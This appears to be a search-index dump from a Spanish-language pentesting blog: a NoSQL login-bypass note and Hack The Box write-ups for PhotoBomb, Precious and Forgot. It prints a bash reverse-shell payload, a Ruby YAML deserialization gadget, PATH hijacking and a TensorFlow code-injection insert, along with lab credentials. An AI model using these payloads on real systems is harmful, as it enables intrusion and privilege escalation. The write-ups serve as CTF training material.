SQL que se ve pocas veces, pero podemos llegar a ver. En este caso traigo una manera de bypasear un panel de login, por si una inyección SQL normal no funciona. En este caso, es cuando se emplea mongodb detrás. Nunca se sabe si se está empleando mysql , mariadb u otro. Por eso hay que probar de todo. Link de referenciaNota: Simplemente fue ir probando, no nos dice que de esa manera se hace, pero esa funcionaadmin'||'1==1" }, { "title": "Notas", "url": "/posts/Notas/", "categories": "Notes", "tags": "", "date": "2022-12-12 00:00:00 -0500", "snippet": "Estas son notas por si acaso, vale?Null ByteSi quieres anular lo que le sigue de una petición en una url, es decir por ejemplo un “.php” para quitarle el “.php” simplemente podrías poner un null by...", "content": "Estas son notas por si acaso, vale?Null ByteSi quieres anular lo que le sigue de una petición en una url, es decir por ejemplo un “.php” para quitarle el “.php” simplemente podrías poner un null byte ó carácter nulo, que lo que hace es quitarte lo que sigue de una url, esto se indica con un “%00”.Por ejemplo:Original: http://example.com/admin.php/Modificado: http://example.com/admin%00Esto podría ser útil ante un LFI.XargsPara jugar con hilos con XARGS. Con las llaves indicamos que queremos remplazar la secuencia del 1 al 2000seq 1 2000 | xargs -P50 -I {} | curl -s -X GET \"http://example.com/{}\"ScpPara bajarnos archivos con scp si tenemos la constraseña de un usuario por ssh, podemos hacerlo de la siguiente forma:scp &lt;user&gt;@&lt;ip&gt;:&lt;recurso que te quieres bajar de la máquina víctima&gt;" }, { "title": "PhotoBomb Writeup", "url": "/posts/writeup-PhotoBomb/", "categories": "Writeup, HTB", "tags": "Linux, CTF, Easy, CommandInjection, Pathhijacking", "date": "2022-11-29 00:00:00 -0500", "snippet": "En esta máquina veremos un information leakage para ver credenciales, inyectaremos comandos a través de una petición en la información de una descarga y haremos un Pathhijacking para convertirnos e...", "content": "En esta máquina veremos un information leakage para ver credenciales, inyectaremos comandos a través de una petición en la información de una descarga y haremos un Pathhijacking para convertirnos en root.ReconocimientoEmpezamos con un escaneo para detectar los puertos que están abiertos❯ nmap -p- --min-rate 5000 --open -n -v -Pn 10.10.11.182 -oG OpenPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-29 18:11 -05Initiating SYN Stealth Scan at 18:11Scanning 10.10.11.182 [65535 ports]Discovered open port 22/tcp on 10.10.11.182Discovered open port 80/tcp on 10.10.11.182Completed SYN Stealth Scan at 18:12, 14.69s elapsed (65535 total ports)Nmap scan report for 10.10.11.182Host is up (0.21s latency).Not shown: 65529 closed tcp ports (reset), 4 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE22/tcp open ssh80/tcp open httpAhora vemos los servicios y la versión de los mismos en base a los puertos abiertos❯ nmap -sC -sV -p22,80 10.10.11.182 -oN targetedStarting Nmap 7.92 ( https://nmap.org ) at 2022-11-29 18:33 -05Nmap scan report for 10.10.11.182Host is up (0.11s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)| 256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)|_ 256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://photobomb.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelCon whatweb vemos el software que se está empleando en la página web por el puerto 80❯ whatweb http://10.10.11.182http://10.10.11.182 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], RedirectLocation[http://photobomb.htb/], Title[302 Found], nginx[1.18.0]Vemos que nos hace un redirect, por lo tanto, añadimos el dominio al /etc/hosts❯ echo \"10.10.11.182 photobomb.htb\" &gt;&gt; /etc/hostsVolvemos a lanzar el whatweb y ya veremos lo que se emplea en la página❯ whatweb http://photobomb.htbhttp://photobomb.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], Script, Title[Photobomb], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]Si nos vamos a la página, vemos que hay un “click here” que nos redirige a “printer”. Pero nos pide credenciales si intentamos ir a esa ruta. Si vemos el código fuente veremos un “photobomb.js” y lo vemos, encontraremos las credenciales.function init() { // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) { document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer'); }}window.onload = init;IntrusiónAhora veremos que podemos descargar imágenes. Veremos cómo se realiza esa solicitud con BurpSuitePetición por BurpEn la parte de “filetype” podemos inyectar comandos, en este caso usaremos python3Nota: Sé que es python porque si pones “http://photobomb.htb/printer/lll” y analisas el código, se ve un directorio con doble barra baja en la máquina local, eso me da a pensar que es con python.En payloadsallthethings hay varias maneras de hacerlo. Antes que nada nos pondremos en escucha con nc por el puerto que le indicamos cuando carguemos el comandoInyecciónHay que tener en cuenta que toca urlencodearlo❯ nc -nlvp 443listening on [any] 443 ...connect to [10.10.16.38] from (UNKNOWN) [10.10.11.182] 33430/bin/sh: 0: can't access tty; job control turned off$ whoamiwizard$ hostname -I 10.10.11.182PrivescVemos que tenemos privilegios sudoers para ejecutar un comando y también para cambiar las variables de entornowizard@photobomb:~/photobomb$ sudo -lMatching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser wizard may run the following commands on photobomb: (root) SETENV: NOPASSWD: /opt/cleanup.shwizard@photobomb:~/photobomb$ Vemos el script que podemos ejecutar#!/bin/bash. /opt/.bashrccd /home/wizard/photobomb# clean up log filesif [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]then /bin/cat log/photobomb.log &gt; log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.logfi# protect the priceless originalsfind source_images -type f -name '*.jpg' -exec chown root:root {} \\;Vemos que al final ejecuta el comando find, por lo tanto vamos a crearnos un fichero con ese nombre, para darle permisos SUID a la bash y le damos permiso de ejecuciónwizard@photobomb:~/photobomb$ echo \"chmod u+s /bin/bash\" &gt; findwizard@photobomb:~/photobomb$ chmod +x findAhora modificamos el path para que nos ejecute primero nuestro fichero y listo, podemos leer la flag de rootwizard@photobomb:~/photobomb$ sudo PATH=$PWD:$PATH /opt/cleanup.sh wizard@photobomb:~/photobomb$ ls -l /bin/bash -rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bashwizard@photobomb:~/photobomb$ bash -p bash-5.0# cat /root/root.txt bc983ca1c7d8dacebc86993f8f786c31bash-5.0#" }, { "title": "Precious Writeup", "url": "/posts/writeup-precious/", "categories": "Writeup, HTB", "tags": "Linux, CTF, Easy, CommandInjection, Sudoers, RCE", "date": "2022-11-27 00:00:00 -0500", "snippet": "En esta máquina veremos cómo se acontece un RCE en base a un apartado donde podemos subir archivos, inyectamos comandos para entrar en la máquina y abusamos del privilegio de sudoers para obtener s...", "content": "En esta máquina veremos cómo se acontece un RCE en base a un apartado donde podemos subir archivos, inyectamos comandos para entrar en la máquina y abusamos del privilegio de sudoers para obtener sesión como rootReconocimientoPrimeramente realizamos un escaneo con nmap para detectar los puertos abiertos❯ nmap -p- --min-rate 5000 --open -v -n -Pn 10.129.77.238 -oG OpenPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 16:16 -05Initiating SYN Stealth Scan at 16:16Scanning 10.129.77.238 [65535 ports]Discovered open port 80/tcp on 10.129.77.238Discovered open port 22/tcp on 10.129.77.238Completed SYN Stealth Scan at 16:16, 14.00s elapsed (65535 total ports)Nmap scan report for 10.129.77.238Host is up (0.12s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpCon whatweb podemos ver qué tecnologías emplea la web que hay en el puerto 80. Vemos que hay un redirec, entonces incluimos el dominio al /etc/hosts❯ whatweb http://10.129.77.238http://10.129.77.238 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.129.77.238], RedirectLocation[http://precious.htb/], Title[302 Found], nginx[1.18.0]http://precious.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15], IP[10.129.77.238], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.15], X-XSS-Protection[1; mode=block], nginx[1.18.0]Luego con nmap detectamos la versión y los servicios que están en los puertos que encontramos previamente abiertos❯ nmap -sCV -p22,80 10.129.77.238 -oN targetedStarting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 16:27 -05Nmap scan report for 10.129.77.238Host is up (0.13s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey: | 3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)| 256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)|_ 256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)80/tcp open http nginx 1.18.0|_http-title: Did not follow redirect to http://precious.htb/|_http-server-header: nginx/1.18.0Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelSi nos vamos a la web, podremos ver un convertidor de web a PDF. Si ponemos un servidor con python podemos ver que nos captura lo que tenemos en local y lo convierte a PDF, sin embargo si interceptamos la petición con BurpSuite en la respuesta veremos “Generated by pdfkit v0.8.6”Petición por BurpIntrusiónSi buscamos vulnerabilidades ante esa versión de pdfkit encontramos este artículo que nos dice cómo explotarla.Si vemos en MonkeyPentester hay una forma de entablarnos una reverse shell con bash, sólo que en este caso le añadimos el bash -c para que nos lea el primer argumento y le hacemos la petición al localhost para que nos ejecute ese comandolocalhost/?name=#{\"%20`bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;tuip&gt;/&lt;puerto&gt; 0&gt;&amp;1'`\"}Antes de hacer lo anterior debimos estar en escucha con nc y obtendremos la shell❯ nc -nlvp 443listening on [any] 443 ...connect to [10.10.16.68] from (UNKNOWN) [10.129.77.238] 55796bash: cannot set terminal process group (679): Inappropriate ioctl for devicebash: no job control in this shellruby@precious:/var/www/pdfapp$ PrivescLuego igualamos TERM a xterm para poder hacer control+L y nos limpie la pantallaruby@precious:/var/www/pdfapp$ export TERM=xtermSi nos vamos al directorio de Home de Ruby podemos ver un directorio “.bundle” oculto al cual si entramos y visualizamos el archivo de configuración encontramos las credenciales de Henryruby@precious:~/.bundle$ lsconfigruby@precious:~/.bundle$ cat config ---BUNDLE_HTTPS://RUBYGEMS__ORG/: \"henry:Q3c1AqGHtoI*******\"ruby@precious:~/.bundle$ Una vez dentro podremos visualizar la flag de userruby@precious:~/.bundle$ su henry Password: henry@precious:/home/ruby/.bundle$ whoamihenryhenry@precious:/home/ruby/.bundle$ cat /home/henry/user.txt 6b76013c67d712c4d671314833926bc7henry@precious:/home/ruby/.bundle$Vemos que tenemos permisos de sudoershenry@precious:~$ sudo -lMatching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rbhenry@precious:~$Visualizamos el /opt/update_dependencies.rb# Compare installed dependencies with those specified in \"dependencies.yml\"require \"yaml\"require 'rubygems'# TODO: update versions automaticallydef update_gems()enddef list_from_file YAML.load(File.read(\"dependencies.yml\"))enddef list_local_gems Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}endgems_file = list_from_filegems_local = list_local_gemsgems_file.each do |file_name, file_version| gems_local.each do |local_name, local_version| if(file_name == local_name) if(file_version != local_version) puts \"Installed version differs from the one specified in file: \" + local_name else puts \"Installed version is equals to the one specified in file: \" + local_name end end endendEs un script en Ruby y vemos que lee y ejecuta un archivo “dependencies.yml” el cual nosotros crearemos y meteremos un payload para escalar privilegios. Si buscamos por archivos yml payloads encontraremos un artículo donde al final nos pone un repositorio en github. Tomamos el segundo payload y lo modificamos para que nos dé permiso SUID en la /bin/bash---- !ruby/object:Gem::Installer i: x- !ruby/object:Gem::SpecFetcher i: y- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: \"abc\" debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module 'Kernel' method_id: :system git_set: \"chmod u+s /bin/bash\" method_id: :resolveLe damos permisos de ejecución al “dependencies.yml”henry@precious:~$ lsdependencies.yml user.txthenry@precious:~$ chmod +x dependencies.ymlLuego ejecutamos con ruby el “/opt/update_dependencies.rb”henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rbListo, veremos que el “/bin/bash” tendrá permiso SUID y simplemente ponemos “bash -p” para convertirnos en root y visualizar la flag de roothenry@precious:~$ ls -l /bin/bash -rwsr-xr-x 1 root root 1234376 Mar 27 2022 /bin/bashhenry@precious:~$ bash -pbash-5.1# whoamirootbash-5.1# cd /root/bash-5.1# cat root.txt 9ac4d14553215cb0537bf66d7232f157bash-5.1#" }, { "title": "Forgot Writeup", "url": "/posts/writeup-forgot/", "categories": "Writeup, HTB", "tags": "Linux, CTF, Medium, Cache Deception, Sudoers, Host Header Attack", "date": "2022-11-19 00:00:00 -0500", "snippet": "En esta máquina veremos un “Host Header attack” para pasar un panel de login. Luego un “web cache deception” para obtener acceso como usuario no privilegiado en la web. Por último abusamos del priv...", "content": "En esta máquina veremos un “Host Header attack” para pasar un panel de login. Luego un “web cache deception” para obtener acceso como usuario no privilegiado en la web. Por último abusamos del privilegio sudoers para obtener root.ReconocimientoPrimeramente realizamos un escaneo con nmap para detectar los puertos abiertos❯ nmap -p- -sS --min-rate 5000 --open -v -n -Pn 10.10.11.188 -oG OpenPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-20 00:34 -05Initiating SYN Stealth Scan at 00:34Scanning 10.10.11.188 [65535 ports]Discovered open port 80/tcp on 10.10.11.188Discovered open port 22/tcp on 10.10.11.188Completed SYN Stealth Scan at 00:34, 13.78s elapsed (65535 total ports)Nmap scan report for 10.10.11.188Host is up (0.22s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpCon whatweb podemos ver qué tecnologías emplea la web que hay en el puerto 80❯ whatweb http://10.10.11.188http://10.10.11.188 [503 Service Unavailable] Country[RESERVED][ZZ], HTML5, HTTPServer[Varnish], IP[10.10.11.188], Title[503 Backend fetch failed], UncommonHeaders[retry-after,x-varnish], Varnish, Via-Proxy[1.1 varnish (Varnish/6.2)]Luego con nmap detectamos la versión y los servicios que están en los puertos que encontramos previamente abiertos❯ nmap -sC -sV -p22,80 10.10.11.188 -oN VersionsStarting Nmap 7.92 ( https://nmap.org ) at 2022-11-20 00:55 -05Nmap scan report for 10.10.11.188Host is up (0.11s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp open http-proxy Varnish http accelerator|_http-title: 503 Backend fetch failed|_http-server-header: VarnishService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelAhora fuzzeamos por directorios a ver qué encontramos.Nota: Nos tiene que aparecer un panel de login en la propia web, si no te aparece reinicia la máquina (me sucedió por eso lo menciono)❯ wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.188/FUZZ=====================================================================ID Response Lines Word Chars Payload =====================================================================000000001: 200 245 L 484 W 5186 Ch \"# directory-list-2.3-medium.txt\" 000000007: 200 245 L 484 W 5186 Ch \"# license, visit http://creativecommons.org/licenses/by-sa/3.0/\" 000000008: 200 245 L 484 W 5186 Ch \"# or send a letter to Creative Commons, 171 Second Street,\" 000000003: 200 245 L 484 W 5186 Ch \"# Copyright 2007 James Fisher\" 000000010: 200 245 L 484 W 5186 Ch \"#\" 000000005: 200 245 L 484 W 5186 Ch \"# This work is licensed under the Creative Commons\" 000000014: 200 245 L 484 W 5186 Ch \"http://10.10.11.188/\" 000000006: 200 245 L 484 W 5186 Ch \"# Attribution-Share Alike 3.0 License. To view a copy of this\" 000000002: 200 245 L 484 W 5186 Ch \"#\" 000000004: 200 245 L 484 W 5186 Ch \"#\" 000000013: 200 245 L 484 W 5186 Ch \"#\" 000000009: 200 245 L 484 W 5186 Ch \"# Suite 300, San Francisco, California, 94105, USA.\" 000000012: 200 245 L 484 W 5186 Ch \"# on atleast 2 different hosts\" 000000011: 200 245 L 484 W 5186 Ch \"# Priority ordered case sensative list, where entries were found\" 000000038: 302 5 L 22 W 189 Ch \"home\" 000000053: 200 245 L 484 W 5189 Ch \"login\" 000001706: 200 252 L 498 W 5227 Ch \"forgot\" 000002357: 302 5 L 22 W 189 Ch \"tickets\" IntrusiónEn en código fuente podemos ver un usuario potencial&lt;!-- Q1 release fix by robert-dev-145092 --&gt;Nos montamos un servidor con python por el puerto 80❯ python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...Ahora en la ruta /forgot que encontramos anteriormente colocamos el usuario que vimos. Realizamos la petición y capturamos la petición con Burpsuite y cambiamos el HOST por nuestra ip y el puerto donde tenemos el servidorGET /forgot?username=robert-dev-145092 HTTP/1.1Host: 10.10.16.47:80User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0Accept: */*Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Connection: closeReferer: http://10.10.11.188/forgotAhora interceptamos la petición de /reset colocando el token que nos dio de manera urlencodeada para luego iniciar sesión como robert-dev-145092. (Si no te funciona el token a la primera, intenta nuevamente con otro token que te da si te quedaste en escucha con python)Petición por BurpUna vez obtenido el acceso a la web, vemos que en el apartado /escalate podemos enviarle un link para que el admin haga click en él.También si vemos el código fuente en el apartado de escalate podemos ver una ruta /admin_tickets si intentamos ingresar vemos que nos dice acceso denegado. Para obtener acceso a esa ruta lo que podemos hacer es lo siguiente:Petición por BurpUna vez hemos hecho esto, colocamos en la url lo mismo que le mandamos al admin sólo que hasta /js porque o sino Burpsuite no nos intercepta la petición, la mandamos al repeater y allí le colocamos /test.jsPetición por BurpVeremos que nos dice “404 not found”, esto es porque ahora simplemente lo hay que hacer es enviarle otra vez a admin el link, pero esta vez, ponle otra s al final del “/test/js”, quedaría tal que así “/test.jss” y esperas un poco a que admin le dé click a ese link. Una vez hecho esto, simplemente en la petición anterior, le agregas una sPetición por BurpListo, ya hemos hecho un “cache deception attack” y capturado la cookie de admin en el lado de la respuesta, ahora sólo resta acceder a “/admin_tickets”. Simplemente intercepta con Burpsuite y cambias la cookie de session de tu usuario actual por la de admin. y veremos las credenciales del usuario por sshCredencialesPrivescNos conectamos por ssh-bash-5.0$ whoamidiego-bash-5.0$ cat user.txt 4929615d53c0dcd5c4e69e18d1665e38-bash-5.0$Podemos ver un script “bot.py” y que se conecta a la base de datos-bash-5.0$ cat bot.py # Fetch Links conn = mysql.connector.connect(host=\"localhost\",database=\"app\",user=\"diego\",password=\"dCb#1!x0%gjq\") cursor = conn.cursor() cursor.execute('select * from forgot') r = cursor.fetchall() Si hacemos sudo -l podemos ver que tenemos un script que podemos ejecutar de manera privilegiada, si lo vemos nos muestra lo siguiente: # Grab links conn = mysql.connector.connect(host='localhost',database='app',user='diego',password='dCb#1!x0%gjq') cursor = conn.cursor() cursor.execute('select reason from escalate') r = [i[0] for i in cursor.fetchall()] conn.close() data=[] for i in r: data.append(i) Xnew = getVec(data)También podemos una librería tensorflow y si buscamos encontramos cómo vulnerarlo para estedef assessData(i): score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i])) if score &gt;= .5: try: preprocess_input_exprs_arg_string(data[i],safe=False) except: passLo que hace es verificar patrones maliciosos en la base de datos. Si saturamos esto, podemos inyectar código para que se ejecute. Nos conectamos a la base de datos y ejecutamos lo siguiente:mysql&gt; insert into escalate values (\"1\",\"1\",\"1\",'test=exec(\"\"\"\\nimport os\\nos.system(\"chmod +s /usr/bin/bash\")\"\"\")');Ahora hacemos bash -p y obtenemos root-bash-5.0$ bash -pbash-5.0# cat /root/root.txt d41b9cbb909802752553be9dd7c82720bash-5.0#" } ]
